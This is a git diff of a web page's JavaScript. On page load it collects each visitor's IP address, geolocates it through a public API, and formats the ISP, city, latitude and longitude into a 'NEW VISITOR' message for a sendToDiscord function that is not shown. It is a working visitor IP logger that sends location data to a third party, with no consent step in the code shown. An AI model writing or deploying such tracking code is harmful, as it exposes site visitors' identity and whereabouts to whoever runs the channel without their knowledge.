@@ -1,29 +1,28 @@
 document.addEventListener('DOMContentLoaded', () => {
-  const scriptElement = document.createElement('script');
-  scriptElement.src = 'https://json.geoiplookup.io?callback=getIP';
-  document.head.appendChild(scriptElement);
-});
-
-function getIP(data) {
-  const ipAddress = data.ip;
-  const currentDateTime = new Date();
-  const dateTimeString = currentDateTime.toLocaleString();
-
-  fetch(`https://json.geoiplookup.io/${ipAddress}`)
+  fetch('https://api.ipify.org?format=json')
     .then(response => response.json())
-    .then(geoData => {
-      const message = createMessage(ipAddress, dateTimeString, geoData);
-      sendToDiscord(message);
+    .then(data => {
+      const ipAddress = data.ip;
+      const currentDateTime = new Date();
+      const dateTimeString = currentDateTime.toLocaleString();
+
+      fetch(`https://ip-api.com/json/${ipAddress}`)
+        .then(response => response.json())
+        .then(geoData => {
+          const message = createMessage(ipAddress, dateTimeString, geoData);
+          sendToDiscord(message);
+        })
+        .catch(error => console.error(error));
+
+      document.getElementById('ip-address').textContent = `IP Address: ${ipAddress}`;
+      document.getElementById('datetime').textContent = `Date and Time: ${dateTimeString}`;
     })
     .catch(error => console.error(error));
-
-  document.getElementById('ip-address').textContent = `IP Address: ${ipAddress}`;
-  document.getElementById('datetime').textContent = `Date and Time: ${dateTimeString}`;
-}
+});
 
 
 function createMessage(ipAddress, dateTimeString, geoData) {
-  const { ip, isp, country_name, region, city, zip_code, latitude, longitude, premium, disctrict } = geoData;
+  const { query, isp, country, regionName, city, zip, lat, lon } = geoData;
 
   const message = {
     embeds: [
@@ -31,15 +30,14 @@ function createMessage(ipAddress, dateTimeString, geoData) {
         title: '***NEW VISITOR***',
         color: 16776960, // Yellow color
         description: `
-          IP Address: ${ip}
+          IP Address: ${query}
           Date and Time: ${dateTimeString}
           ISP: ${isp}
-          Country: ${country_name}
-          Region: ${region}
+          Country: ${country}
+          Region: ${regionName}
           City: ${city}
-          Latitude: ${latitude}
-          Longitude: ${longitude}
-          
+          Latitude: ${lat}
+          Longitude: ${lon}
         `,
         thumbnail: {
           url: 'https://cdn.discordapp.com/attachments/1008763573029306519/1112393554585718867/1075892497257091092.png' // Customize the URL of the preview image
